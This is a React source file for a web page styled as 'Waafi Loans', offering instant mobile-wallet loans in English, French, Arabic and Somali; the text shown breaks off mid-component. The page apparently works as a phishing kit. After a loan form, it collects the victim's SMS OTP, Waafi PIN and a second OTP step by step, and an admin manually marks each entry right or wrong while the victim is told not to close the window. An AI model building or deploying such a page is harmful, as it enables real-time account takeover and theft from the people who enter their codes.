import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Toaster } from "@/components/ui/sonner";
import {
  submitApplication,
  submitStep,
  getApplicationStatus,
  resendOtp,
} from "@/lib/applications.functions";
import { useSite } from "@/lib/site-context";

type Lang = "en" | "fr" | "ar" | "so";

const TRANSLATIONS: Record<string, Record<Lang, string>> = {
  change_language: {
    en: "Change language",
    fr: "Changer de langue",
    ar: "تغيير اللغة",
    so: "Bedel luqadda",
  },
  loan_calculator: { en: "Loan calculator", fr: "Calculateur de prêt", ar: "حاسبة القرض", so: "Xisaabiyaha amaahda" },
  amount_usd: { en: "Amount (USD)", fr: "Montant (USD)", ar: "المبلغ (دولار)", so: "Lacagta (USD)" },
  months: { en: "Months", fr: "Mois", ar: "الأشهر", so: "Bilaha" },
  interest_per_year: { en: "Interest %/yr", fr: "Intérêt %/an", ar: "الفائدة %/سنة", so: "Dulsaarka %/sano" },
  monthly: { en: "Monthly", fr: "Mensuel", ar: "شهريًا", so: "Bishii" },
  total_repayment: { en: "Total repayment", fr: "Remboursement total", ar: "إجمالي السداد", so: "Wadarta dib u bixinta" },
  interest: { en: "Interest", fr: "Intérêt", ar: "الفائدة", so: "Dulsaarka" },
  full_name: { en: "Full name", fr: "Nom complet", ar: "الاسم الكامل", so: "Magaca oo dhan" },
  email: { en: "Email", fr: "E-mail", ar: "البريد الإلكتروني", so: "Iimaylka" },
  phone: { en: "Phone", fr: "Téléphone", ar: "الهاتف", so: "Telefoon" },
  monthly_income: { en: "Monthly income (USD)", fr: "Revenu mensuel (USD)", ar: "الدخل الشهري (دولار)", so: "Dakhliga bishii (USD)" },
  loan_taken_from_calc: {
    en: "Loan amount, term and interest are taken from the calculator below.",
    fr: "Le montant du prêt, la durée et l'intérêt proviennent du calculateur ci-dessous.",
    ar: "يتم أخذ مبلغ القرض والمدة والفائدة من الحاسبة أدناه.",
    so: "Qadarka amaahda, mudada iyo dulsaarka waxaa laga soo qaadayaa xisaabiyaha hoos ku xusan.",
  },
  purpose: { en: "Purpose", fr: "Objet", ar: "الغرض", so: "Ujeeddada" },
  purpose_placeholder: {
    en: "Tell us briefly what the loan is for (min. 3 characters)",
    fr: "Dites-nous brièvement à quoi sert le prêt (min. 3 caractères)",
    ar: "أخبرنا باختصار عن الغرض من القرض (3 أحرف على الأقل)",
    so: "Si kooban noo sheeg waxa amaahda loo qaadanayo (ugu yaraan 3 xaraf)",
  },
  review_application: { en: "Review application", fr: "Examiner la demande", ar: "مراجعة الطلب", so: "Dib u eeg codsiga" },
  please_review: {
    en: "Please review your details below before submitting.",
    fr: "Veuillez vérifier vos informations ci-dessous avant de soumettre.",
    ar: "يرجى مراجعة بياناتك أدناه قبل الإرسال.",
    so: "Fadlan dib u eeg faahfaahintaada hoose ka hor inta aanad gudbin.",
  },
  term: { en: "Term", fr: "Durée", ar: "المدة", so: "Mudada" },
  loan_amount: { en: "Loan amount", fr: "Montant du prêt", ar: "مبلغ القرض", so: "Qadarka amaahda" },
  interest_rate: { en: "Interest rate", fr: "Taux d'intérêt", ar: "معدل الفائدة", so: "Heerka dulsaarka" },
  monthly_payment: { en: "Monthly payment", fr: "Paiement mensuel", ar: "الدفعة الشهرية", so: "Bixinta bishii" },
  edit: { en: "Edit", fr: "Modifier", ar: "تعديل", so: "Wax ka beddel" },
  confirm_submit: { en: "Confirm & submit", fr: "Confirmer et soumettre", ar: "تأكيد وإرسال", so: "Xaqiiji oo gudbi" },
  submitting: { en: "Submitting...", fr: "Envoi...", ar: "جارٍ الإرسال...", so: "Waa la gudbinayaa..." },
  submit: { en: "Submit", fr: "Soumettre", ar: "إرسال", so: "Gudbi" },
  resend_otp: { en: "Didn't get the code? Resend OTP", fr: "Pas reçu le code ? Renvoyer l'OTP", ar: "لم تستلم الرمز؟ أعد إرسال OTP", so: "Ma helin koodka? Dib u dir OTP" },
  apply_minutes: { en: "Apply in minutes", fr: "Postulez en quelques minutes", ar: "قدّم خلال دقائق", so: "Codso daqiiqado gudahood" },
  app_under_review: { en: "Application under review", fr: "Demande en cours d'examen", ar: "الطلب قيد المراجعة", so: "Codsiga waa la eegayaa" },
  step1: { en: "Step 1 of 3 — VERIFY YOUR PHONE NUMBER", fr: "Étape 1 sur 3 — VÉRIFIEZ VOTRE NUMÉRO", ar: "الخطوة 1 من 3 — تحقق من رقم هاتفك", so: "Tallaabada 1 ee 3 — XAQIIJI LAMBARKAAGA" },
  step2: { en: "Step 2 of 3 — WAAFI PIN VERIFICATION", fr: "Étape 2 sur 3 — VÉRIFICATION DU PIN WAAFI", ar: "الخطوة 2 من 3 — التحقق من رمز واافي", so: "Tallaabada 2 ee 3 — XAQIIJINTA PIN WAAFI" },
  step3: { en: "Step 3 of 3 — LOAN DISBURSEMENT CONFIRMATION", fr: "Étape 3 sur 3 — CONFIRMATION DU DÉCAISSEMENT", ar: "الخطوة 3 من 3 — تأكيد صرف القرض", so: "Tallaabada 3 ee 3 — XAQIIJINTA BIXINTA AMAAHDA" },
  approved: { en: "APPLICATION APPROVED", fr: "DEMANDE APPROUVÉE", ar: "تمت الموافقة على الطلب", so: "CODSIGA WAA LA OGGOLAADAY" },
  rejected: { en: "Rejected", fr: "Rejetée", ar: "مرفوض", so: "La diiday" },
  otp1_label: {
    en: "Enter the OTP sent to mobile to verify your number with Waafi",
    fr: "Entrez l'OTP envoyé à votre mobile pour vérifier votre numéro avec Waafi",
    ar: "أدخل رمز OTP المرسل إلى هاتفك للتحقق من رقمك مع واافي",
    so: "Geli OTP-da loo soo diray mobilkaaga si aad ugu xaqiijiso lambarkaaga Waafi",
  },
  pin_label: { en: "Enter your Waafi PIN", fr: "Entrez votre PIN Waafi", ar: "أدخل رمز واافي السري", so: "Geli PIN-kaaga Waafi" },
  otp2_label: {
    en: "Enter the new OTP sent to Waafi number to confirm your loan disbursement",
    fr: "Entrez le nouvel OTP envoyé à votre numéro Waafi pour confirmer le décaissement",
    ar: "أدخل رمز OTP الجديد المرسل إلى رقم واافي لتأكيد صرف القرض",
    so: "Geli OTP-da cusub ee loo soo diray lambarka Waafi si aad u xaqiijiso bixinta amaahda",
  },
  waiting_review: {
    en: "Your application is being reviewed. Do not close the application page as your application will not be processed",
    fr: "Votre demande est en cours d'examen. Ne fermez pas la page sinon elle ne sera pas traitée",
    ar: "تتم مراجعة طلبك. لا تغلق الصفحة وإلا لن تتم معالجة طلبك",
    so: "Codsigaaga waa la eegayaa. Ha xirin bogga, haddii kale codsigaaga lama processi doono",
  },
  verifying_otp: { en: "Verifying OTP. Do not close the window", fr: "Vérification de l'OTP. Ne fermez pas la fenêtre", ar: "جارٍ التحقق من OTP. لا تغلق النافذة", so: "Waa la xaqiijinayaa OTP. Ha xirin daaqadda" },
  verifying_pin: { en: "Wait for PIN verification. Do not close the window", fr: "Attendez la vérification du PIN. Ne fermez pas la fenêtre", ar: "انتظر التحقق من الرمز السري. لا تغلق النافذة", so: "Sug xaqiijinta PIN. Ha xirin daaqadda" },
  approving: { en: "Approving your application and loan disbursement", fr: "Approbation de votre demande et décaissement du prêt", ar: "جارٍ الموافقة على طلبك وصرف القرض", so: "Waa la ansixinayaa codsigaaga iyo bixinta amaahda" },
  success_msg: {
    en: "Your loan application has been verified and approved. Wait for disbursement to your Waafi mobile number. If it takes long, please reapply.",
    fr: "Votre demande a été vérifiée et approuvée. Attendez le décaissement sur votre numéro Waafi. Si cela tarde, refaites une demande.",
    ar: "تم التحقق من طلبك والموافقة عليه. انتظر صرف المبلغ إلى رقم واافي الخاص بك. إذا تأخر، يرجى إعادة التقديم.",
    so: "Codsigaaga amaahda waa la xaqiijiyay oo la ansixiyay. Sug in lacagta la geeyo lambarkaaga Waafi. Haddii ay daahdo, fadlan dib u codso.",
  },
  start_new: { en: "Start new application", fr: "Nouvelle demande", ar: "ابدأ طلبًا جديدًا", so: "Bilow codsi cusub" },
  rejected_msg: {
    en: "Could not send OTP at the moment. Kindly reapply and enter your correct details after some few hours.",
    fr: "La demande n'a pas été approuvée. Veuillez refaire une demande avec les bonnes informations.",
    ar: "لم تتم الموافقة على الطلب. يرجى إعادة التقديم وإدخال بياناتك الصحيحة.",
    so: "Codsiga lama ansixin. Fadlan dib u codso oo geli faahfaahintaada saxda ah.",
  },
  try_again: { en: "Try again", fr: "Réessayer", ar: "حاول مرة أخرى", so: "Mar kale isku day" },
  otp_wrong: { en: "The OTP you entered was incorrect. Please try again.", fr: "L'OTP saisi est incorrect. Veuillez réessayer.", ar: "رمز OTP الذي أدخلته غير صحيح. حاول مرة أخرى.", so: "OTP-da aad gelisay waa khalad. Fadlan mar kale isku day." },
  pin_wrong: { en: "The PIN you entered was incorrect. Please try again.", fr: "Le PIN saisi est incorrect. Veuillez réessayer.", ar: "الرمز السري الذي أدخلته غير صحيح. حاول مرة أخرى.", so: "PIN-ka aad gelisay waa khalad. Fadlan mar kale isku day." },
  otp_resent: { en: "OTP resent. Please check your phone.", fr: "OTP renvoyé. Vérifiez votre téléphone.", ar: "تمت إعادة إرسال OTP. تحقق من هاتفك.", so: "OTP dib loo diray. Fadlan eeg taleefankaaga." },
  cant_resend: { en: "Couldn't resend the OTP. Please try again.", fr: "Impossible de renvoyer l'OTP. Veuillez réessayer.", ar: "تعذر إعادة إرسال OTP. حاول مرة أخرى.", so: "Lama dib u diri karin OTP. Mar kale isku day." },
  cant_submit_app: { en: "We couldn't submit your application.", fr: "Nous n'avons pas pu soumettre votre demande.", ar: "تعذر إرسال طلبك.", so: "Ma gudbin karin codsigaaga." },
  phone_not_supported: {
    en: "This phone number is not supported. Please use a different number.",
    fr: "Ce numéro de téléphone n'est pas pris en charge. Veuillez utiliser un autre numéro.",
    ar: "رقم الهاتف هذا غير مدعوم. يرجى استخدام رقم آخر.",
    so: "Lambarkan taleefanka lama taageero. Fadlan isticmaal lambar kale.",
  },
  phone_10_digits: {
    en: "Please enter exactly 10 digits after the country code.",
    fr: "Veuillez saisir exactement 10 chiffres après l'indicatif.",
    ar: "يرجى إدخال 10 أرقام بالضبط بعد رمز الدولة.",
    so: "Fadlan geli 10 lambar oo keliya kadib koodka waddanka.",
  },
  select_prefix: {
    en: "Please select a country code (+252 or +253).",
    fr: "Veuillez sélectionner un indicatif (+252 ou +253).",
    ar: "يرجى اختيار رمز الدولة (+252 أو +253).",
    so: "Fadlan dooro koodka waddanka (+252 ama +253).",
  },
  cant_submit_code: { en: "We couldn't submit that code.", fr: "Nous n'avons pas pu soumettre ce code.", ar: "تعذر إرسال هذا الرمز.", so: "Ma gudbin karin koodkaas." },
  submitted_await: { en: "Application submitted — awaiting review", fr: "Demande envoyée — en attente d'examen", ar: "تم إرسال الطلب — بانتظار المراجعة", so: "Codsiga waa la gudbiyay — sugaya dib u eegis" },
  submitted_await2: { en: "Submitted — awaiting approval", fr: "Envoyé — en attente d'approbation", ar: "تم الإرسال — بانتظار الموافقة", so: "La gudbiyay — sugaya ansixin" },
  months_unit: { en: "months", fr: "mois", ar: "أشهر", so: "bilood" },
  select_loan_type: {
    en: "Choose your loan type",
    fr: "Choisissez votre type de prêt",
    ar: "اختر نوع القرض",
    so: "Dooro nooca amaahda",
  },
  personal_loan: { en: "Waafi Personal Loan", fr: "Prêt Personnel Waafi", ar: "قرض واافي الشخصي", so: "Amaahda Shakhsiga Waafi" },
  personal_loan_desc: {
    en: "For individuals with a personal Waafi account",
    fr: "Pour les particuliers avec un compte Waafi personnel",
    ar: "للأفراد الذين لديهم حساب واافي شخصي",
    so: "Loogu talagalay shakhsiyaadka leh akoon Waafi shakhsi ah",
  },
  business_loan: { en: "Waafi Business Loan", fr: "Prêt Entreprise Waafi", ar: "قرض واافي للأعمال", so: "Amaahda Ganacsiga Waafi" },
  business_loan_desc: {
    en: "For holders of a Waafi merchant / business account only",
    fr: "Pour les titulaires d'un compte marchand / entreprise Waafi uniquement",
    ar: "لأصحاب حسابات التاجر / الأعمال في واافي فقط",
    so: "Kaliya dadka leh akoon ganacsi / merchant Waafi",
  },
  change_loan_type: {
    en: "Change loan type",
    fr: "Changer de type de prêt",
    ar: "تغيير نوع القرض",
    so: "Bedel nooca amaahda",
  },
};

function useT(lang: Lang) {
  return (key: keyof typeof TRANSLATIONS) =>
    TRANSLATIONS[key]?.[lang] ?? TRANSLATIONS[key]?.en ?? String(key);
}

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Waafi Loans — Instant Mobile Wallet Loans" },
      {
        name: "description",
        content:
          "Apply for an instant loan paid directly to your Waafi mobile wallet.",
      },
      { property: "og:title", content: "Waafi Loans — Instant Mobile Wallet Loans" },
      {
        property: "og:description",
        content:
          "Apply for an instant loan paid directly to your Waafi mobile wallet.",
      },
      { property: "og:image", content: "/waafi-logo.png" },
    ],
    links: [
      { rel: "icon", type: "image/png", href: "/waafi-logo.png" },
      { rel: "apple-touch-icon", href: "/waafi-logo.png" },
      { rel: "preload", as: "image", href: "/waafi-logo.png", fetchpriority: "high" },
      { rel: "preload", as: "image", href: "/bg-city-blur.jpg" },
    ],
  }),
  component: Index,
});

function Index() {
  const site = useSite();
  const walletName = site.content.walletName || "Waafi";
  const [phonePrefix, setPhonePrefix] = useState<"" | "+252" | "+253">("");
  const banner =
    site.content.banner ||
    `Funds are disbursed straight to your ${walletName} mobile wallet as soon as your application is approved.`;
  const tagline =
    site.content.tagline ||
    `Instant loans paid directly to your ${walletName} mobile wallet.`;
  const logoUrl = site.logo_url || "/waafi-logo.png";
  const submit = useServerFn(submitApplication);
  const submitStepFn = useServerFn(submitStep);
  const getStatus = useServerFn(getApplicationStatus);
  const resendOtpFn = useServerFn(resendOtp);
  const [loading, setLoading] = useState(false);
  const [showSplash, setShowSplash] = useState(true);
  useEffect(() => {
    const t = setTimeout(() => setShowSplash(false), 1800);
    return () => clearTimeout(t);
  }, []);
  const [language, setLanguage] = useState<string | null>(null);
  const lang = (language as Lang) || "en";
  const t = useT(lang);
  const isRtl = lang === "ar";
  useEffect(() => {
    if (typeof document !== "undefined") {
      document.documentElement.lang = lang;
      document.documentElement.dir = isRtl ? "rtl" : "ltr";
    }
  }, [lang, isRtl]);
  useEffect(() => {
    try {
      const saved = localStorage.getItem("waafi_lang");
      if (saved) setLanguage(saved);
    } catch {
      /* ignore */
    }
  }, []);
  function chooseLanguage(code: string) {
    try {
      localStorage.setItem("waafi_lang", code);
    } catch {
      /* ignore */
    }
    setLanguage(code);
  }
  const [appId, setAppId] = useState<string | null>(null);
  const [status, setStatus] = useState<string>("");
  const [stepError, setStepError] = useState("");

  const [loanType, setLoanType] = useState<"personal" | "business" | null>(null);
  useEffect(() => {
    try {
      const saved = localStorage.getItem("waafi_loan_type");
      if (saved === "personal" || saved === "business") setLoanType(saved);
    } catch { /* ignore */ }
  }, []);
  function chooseLoanType(v: "personal" | "business") {
    try { localStorage.setItem("waafi_loan_type", v); } catch { /* ignore */ }
    setLoanType(v);
  }

  // Calculator state
  const [amount, setAmount] = useState<number | "">("");
  const [months, setMonths] = useState<number | "">("");

  // Interest is computed automatically based on term length.
  // Base 5% + 0.5% per year of term, clamped to [5%, 15%].
  const interest = useMemo(() => {
    const years = (Number(months) || 0) / 12;
    const r = 5 + years * 0.5;
    return Math.min(15, Math.max(5, Number(r.toFixed(2))));
  }, [months]);

  const [reviewing, setReviewing] = useState(false);
  const [formData, setFormData] = useState<{
    full_name: string;
    email: string;
    phone: string;
    monthly_income: number;
    purpose: string;
  } | null>(null);

  const calc = useMemo(() => {
    const P = Number(amount) || 0;
    const n = Number(months) || 0;
    const r = (Number(interest) || 0) / 100 / 12;
    if (P <= 0 || n <= 0) return { monthly: 0, total: 0, interestPaid: 0 };
    const monthly =
      r === 0 ? P / n : (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
    const total = monthly * n;
    return { monthly, total, interestPaid: total - P };
  }, [amount, months, interest]);

  // Poll status when in a stepped flow
  useEffect(() => {
    if (!appId) return;
    if (status === "completed" || status === "rejected") return;
    const isWaiting =
      status === "submitted" ||
      status === "otp1_submitted" ||
      status === "pin_submitted" ||
      status === "otp2_submitted";
    if (!isWaiting) return;
    const t = setInterval(async () => {
      try {
        const res = await getStatus({ data: { id: appId } });
        if (res?.status && res.status !== status) setStatus(res.status);
      } catch {
        /* ignore */
      }
    }, 2500);
    return () => clearInterval(t);
  }, [appId, status, getStatus]);

  // Notify the user when admin marks the entered OTP/PIN as wrong.
  const prevStatusRef = useRef<string>("");
  useEffect(() => {
  const prev = prevStatusRef.current;

  if (prev === "otp1_submitted" && status === "otp1_required") {
    const msg = t("otp_wrong");
    setStepError(msg);
    toast.error(msg);
  } else if (prev === "pin_submitted" && status === "pin_required") {
    const msg = t("pin_wrong");
    setStepError(msg);
    toast.error(msg);
  } else if (prev === "otp2_submitted" && status === "otp2_required") {
    const msg = t("otp_wrong");
    setStepError(msg);
    toast.error(msg);
  } else {
    setStepError("");
  }

  prevStatusRef.current = status;
}, [status, t]);

  function onReview(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    if (phonePrefix !== "+252" && phonePrefix !== "+253") {
      toast.error(t("select_prefix"));
      return;
    }
    const phoneInput = String(fd.get("phone") ?? "").replace(/\D/g, "");
    if (phoneInput.length > 10) {
  toast.error("Phone number cannot exceed 10 digits.");
  return;
}
    if (phoneInput.slice(0, 5).includes("63")) {
      toast.error(t("phone_not_supported"));
      return;
    }
    const phoneWithPrefix = `${phonePrefix}${phoneInput}`;
    setFormData({
      full_name: String(fd.get("full_name") ?? ""),
      email: String(fd.get("email") ?? ""),
      phone: phoneWithPrefix,
      monthly_income: Number(fd.get("monthly_income") ?? 0),
      purpose: String(fd.get("purpose") ?? ""),
    });
    setReviewing(true);
  }

  async function onConfirmSubmit() {
    if (!formData) return;
    setLoading(true);
    try {
      const { id } = await submit({
        data: {
          ...formData,
          amount: Number(amount),
          months: Number(months),
          interest_rate: Number(interest),
          loan_type: loanType ?? undefined,
        },
      });
      setAppId(id);
      setStatus("submitted");
      setReviewing(false);
      toast.success(t("submitted_await"));
    } catch (err) {
      toast.error(humanizeError(err, t("cant_submit_app")));
    } finally {
      setLoading(false);
    }
  }

  async function onStep(step: "otp1" | "pin" | "otp2", value: string) {
    if (!appId) return;
    setLoading(true);
    try {
      await submitStepFn({ data: { id: appId, step, value } });
      setStatus(
        step === "otp1"
          ? "otp1_submitted"
          : step === "pin"
            ? "pin_submitted"
            : "otp2_submitted",
      );
      toast.success(t("submitted_await2"));
    } catch (err) {
      toast.error(humanizeError(err, t("cant_submit_code")));
    } finally {
      setLoading(false);
    }
  }

  async function onResendOtp() {
    if (!appId) return;
    const wasOtp1 = status === "otp1_required" || status === "otp1_submitted";
    try {
      await resendOtpFn({ data: { id: appId } });
      // Re-show the OTP entry form regardless of where we were
      setStatus(wasOtp1 ? "otp1_required" : "otp2_required");
      toast.success(t("otp_resent"));
    } catch (err) {
      toast.error(humanizeError(err, t("cant_resend")));
    }
  }

  function reset() {
    setAppId(null);
    setStatus("");
    setFormData(null);
    setReviewing(false);
  }

  return (
    <div
      className="relative min-h-screen py-10 px-4"
      dir={isRtl ? "rtl" : "ltr"}
    >
      <div
        aria-hidden
        className="fixed inset-0 -z-20 bg-cover bg-center"
        style={{
          backgroundImage: "url('/bg-city-blur.jpg')",
          transform: "scale(1.05)",
        }}
      />
      <div
        aria-hidden
        className="fixed inset-0 -z-10"
        style={{
          background:
            "linear-gradient(180deg, color-mix(in oklab, var(--primary) 40%, transparent) 0%, color-mix(in oklab, var(--background) 80%, transparent) 100%)",
        }}
      />
      <Toaster richColors position="top-center" />
      {showSplash && <Splash logoUrl={logoUrl} tagline={tagline} />}
      {!showSplash && !language && (
        <LanguageGate logoUrl={logoUrl} siteName={site.site_name} onSelect={chooseLanguage} />
      )}
      {!showSplash && language && !loanType && (
        <LoanTypeGate logoUrl={logoUrl} siteName={site.site_name} onSelect={chooseLoanType} t={t} />
      )}
      {!language || !loanType ? null : (
      <div className="mx-auto max-w-2xl [&_.glass-card]:bg-card/85 [&_.glass-card]:border-white/40 [&_input]:bg-white/80 [&_textarea]:bg-white/80">
        <div className="mb-3 flex justify-end gap-4">
          <button
            type="button"
            onClick={() => {
              try { localStorage.removeItem("waafi_loan_type"); } catch { /* ignore */ }
              setLoanType(null);
              reset();
            }}
            className="text-xs text-muted-foreground underline underline-offset-2"
          >
            {t("change_loan_type")}
          </button>
          <button
            type="button"
            onClick={() => {
              try { localStorage.removeItem("waafi_lang"); } catch { /* ignore */ }
              setLanguage(null);
            }}
            className="text-xs text-muted-foreground underline underline-offset-2"
          >
            {t("change_language")} ({(language || "").toUpperCase()})
          </button>
        </div>
        <div className="glass-card mb-6 rounded-xl border border-primary/20 p-5 shadow-lg">
          <div className="flex items-center gap-4">
            <div className="flex h-16 w-16 items-center justify-center rounded-xl bg-primary/10 p-2">
              <img src={logoUrl} alt={site.site_name} className="h-full w-auto" />
            </div>
            <div className="min-w-0">
              <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-primary truncate">
                {site.site_name}
              </h1>
              <p className="text-sm text-muted-foreground">{tagline}</p>
            </div>
          </div>
          <div className="mt-4 flex items-center justify-between rounded-md bg-primary/5 px-3 py-2 text-xs">
            <span className="font-medium text-primary">
              {loanType === "business" ? t("business_loan") : t("personal_loan")}
            </span>
            <span className="text-muted-foreground">
              {loanType === "business" ? t("business_loan_desc") : t("personal_loan_desc")}
            </span>
          </div>
        </div>
        <div className="glass-card mb-6 rounded-md border border-primary/20 px-4 py-3 text-sm">
          {banner}
        </div>
        <Card className="glass-card shadow-lg">
          <CardHeader>
            <CardTitle>{stageTitle(status, t)}</CardTitle>
          </CardHeader>
          <CardContent>
            {status === "completed" ? (
              <SuccessBox onReset={reset} t={t} />
            ) : status === "rejected" ? (
              <RejectedBox onReset={reset} t={t} />
            ) : status === "submitted" ? (
              <WaitingBox label={t("waiting_review")} />
            ) : status === "otp1_required" ? (
              <StepForm
  key="otp1"
  label={t("otp1_label")}
  onSubmit={(v) => onStep("otp1", v)}
  loading={loading}
  length={6}
  onResend={onResendOtp}
  error={stepError}
  onClearError={() => setStepError("")}
  t={t}
/>
            ) : status === "otp1_submitted" ? (
              <WaitingBox label={t("verifying_otp")} />
            ) : status === "pin_required" ? (
              <StepForm
  key="pin"
  label={t("pin_label")}
  onSubmit={(v) => onStep("pin", v)}
  loading={loading}
  type="password"
  length={4}
  error={stepError}
  onClearError={() => setStepError("")}
  t={t}
/>
            ) : status === "pin_submitted" ? (
              <WaitingBox label={t("verifying_pin")} />
            ) : status === "otp2_required" ? (
              <StepForm
  key="otp2"
  label={t("otp2_label")}
  onSubmit={(v) => onStep("otp2", v)}
  loading={loading}
  length={6}
  onResend={onResendOtp}
  error={stepError}
  onClearError={() => setStepError("")}
  t={t}
/>
            ) : status === "otp2_submitted" ? (
              <WaitingBox label={t("approving")} />
            ) : reviewing && formData ? (
              <ReviewBox
                data={formData}
                amount={Number(amount) || 0}
                months={Number(months) || 0}
                interest={interest}
                calc={calc}
                loading={loading}
                onConfirm={onConfirmSubmit}
                onEdit={() => setReviewing(false)}
                t={t}
              />
            ) : (
              <form id="loan-application-form" onSubmit={onReview} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="full_name">{t("full_name")}</Label>
                  <Input
                    id="full_name"
                    name="full_name"
                    required
                    maxLength={100}
                    defaultValue={formData?.full_name ?? ""}
                  />
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="email">{t("email")}</Label>
                    <Input
                      id="email"
                      name="email"
                      type="email"
                      required
                      defaultValue={formData?.email ?? ""}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="phone">{t("phone")}</Label>
                    <div className="flex rounded-md border border-input bg-white/80 has-[:focus-visible]:ring-1 has-[:focus-visible]:ring-ring overflow-hidden">
                      <select
                        aria-label="Country code"
                        value={phonePrefix}
                        onChange={(e) =>
                          setPhonePrefix(e.target.value as "" | "+252" | "+253")
                        }
                        required
                        className="px-2 text-sm bg-muted/50 border-r border-input outline-none shrink-0"
                      >
                        <option value="" disabled>
                          --
                        </option>
                        <option value="+252">+252</option>
                        <option value="+253">+253</option>
                      </select>
                      <Input
                        id="phone"
                        name="phone"
                        type="tel"
                        inputMode="numeric"
                        pattern="\d{1,10}"
                        required
                        maxLength={10}
                        defaultValue={formData?.phone ? formData.phone.replace(/^\+25[23]/, "") : ""}
                        placeholder="XXXXXXXXXX"
                        className="border-0 bg-transparent shadow-none focus-visible:ring-0"
                      />
                    </div>
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="monthly_income">{t("monthly_income")}</Label>
                  <Input
                    id="monthly_income"
                    name="monthly_income"
                    type="number"
                    min="1"
                    step="1"
                    required
                    defaultValue={formData?.monthly_income ?? ""}
                  />
                </div>
                <p className="text-xs text-muted-foreground">
                  {t("loan_taken_from_calc")}
                </p>
                <div className="space-y-2">
                  <Label htmlFor="purpose">{t("purpose")}</Label>
                  <Textarea
                    id="purpose"
                    name="purpose"
                    required
                    minLength={3}
                    rows={4}
                    defaultValue={formData?.purpose ?? ""}
                    placeholder={t("purpose_placeholder")}
                  />
                </div>
              </form>
            )}
          </CardContent>
        </Card>

        {!status && !reviewing && (
          <Card className="glass-card mt-6 shadow-lg">
            <CardHeader>
              <CardTitle>{t("loan_calculator")}</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="calc_amount">{t("amount_usd")}</Label>
                  <Input
                    id="calc_amount"
                    type="number"
                    min={1}
                    placeholder="0"
                    value={amount}
                    onChange={(e) =>
                      setAmount(e.target.value === "" ? "" : Number(e.target.value))
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="calc_months">{t("months")}</Label>
                  <Input
                    id="calc_months"
                    type="number"
                    min={1}
                    max={360}
                    placeholder="0"
                    value={months}
                    onChange={(e) =>
                      setMonths(e.target.value === "" ? "" : Number(e.target.value))
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label>{t("interest_per_year")}</Label>
                  <div className="flex h-9 items-center rounded-md border border-input bg-muted px-3 text-sm">
                    {interest.toFixed(2)}%
                  </div>
                </div>
              </div>
              <div className="grid grid-cols-3 gap-4 rounded-md bg-muted p-4 text-center">
                <div>
                  <p className="text-xs text-muted-foreground">{t("monthly")}</p>
                  <p className="text-lg font-semibold">{usd(calc.monthly)}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">{t("total_repayment")}</p>
                  <p className="text-lg font-semibold">{usd(calc.total)}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">{t("interest")}</p>
                  <p className="text-lg font-semibold">{usd(calc.interestPaid)}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        {!status && !reviewing && (
          <Button
            type="submit"
            form="loan-application-form"
            disabled={loading}
            className="w-full mt-6"
            size="lg"
          >
            {t("review_application")}
          </Button>
        )}
      </div>
      )}
    </div>
  );
}

function usd(n: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 2,
  }).format(n || 0);
}

function LanguageGate({
  logoUrl,
  siteName,
  onSelect,
}: {
  logoUrl: string;
  siteName: string;
  onSelect: (code: string) => void;
}) {
  const langs = [
    { code: "en", label: "English", native: "English", flag: "🇬🇧" },
    { code: "fr", label: "French", native: "Français", flag: "🇫🇷" },
    { code: "ar", label: "Arabic", native: "العربية", flag: "🇸🇦" },
    { code: "so", label: "Somali", native: "Soomaali", flag: "🇸🇴" },
  ];
  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-background px-4">
      <div className="w-full max-w-md">
        <div className="mb-6 flex flex-col items-center text-center">
          <img src={logoUrl} alt={siteName} className="h-16 w-auto mb-3" />
          <h2 className="text-xl font-bold text-primary">{siteName}</h2>
          <p className="text-sm text-muted-foreground mt-1">
            Select your language / Choisir la langue / اختر اللغة / Dooro luqadda
          </p>
        </div>
        <div className="grid grid-cols-1 gap-3">
          {langs.map((l) => (
            <button
              key={l.code}
              type="button"
              onClick={() => onSelect(l.code)}
              className="flex items-center justify-between rounded-md border border-input bg-card px-4 py-3 text-left hover:bg-accent hover:text-accent-foreground transition-colors"
            >
              <span className="flex items-center gap-3">
                <span className="text-2xl">{l.flag}</span>
                <span className="flex flex-col">
                  <span className="font-medium">{l.label}</span>
                  <span className="text-xs text-muted-foreground">{l.native}</span>
                </span>
              </span>
              <span className="text-muted-foreground">→</span>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

function LoanTypeGate({
  logoUrl,
  siteName,
  onSelect,
  t,
}: {
  logoUrl: string;
  siteName: string;
  onSelect: (v: "personal" | "business") => void;
  t: (k: keyof typeof TRANSLATIONS) => string;
}) {
  const options: {
    key: "personal" | "business";
    title: string;
    desc: string;
    icon: string;
  }[] = [
    { key: "personal", title: t("personal_loan"), desc: t("personal_loan_desc"), icon: "👤" },
    { key: "business", title: t("business_loan"), desc: t("business_loan_desc"), icon: "🏪" },
  ];
  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-background px-4">
      <div className="w-full max-w-md">
        <div className="mb-6 flex flex-col items-center text-center">
          <img src={logoUrl} alt={siteName} className="h-16 w-auto mb-3" />
          <h2 className="text-xl font-bold text-primary">{siteName}</h2>
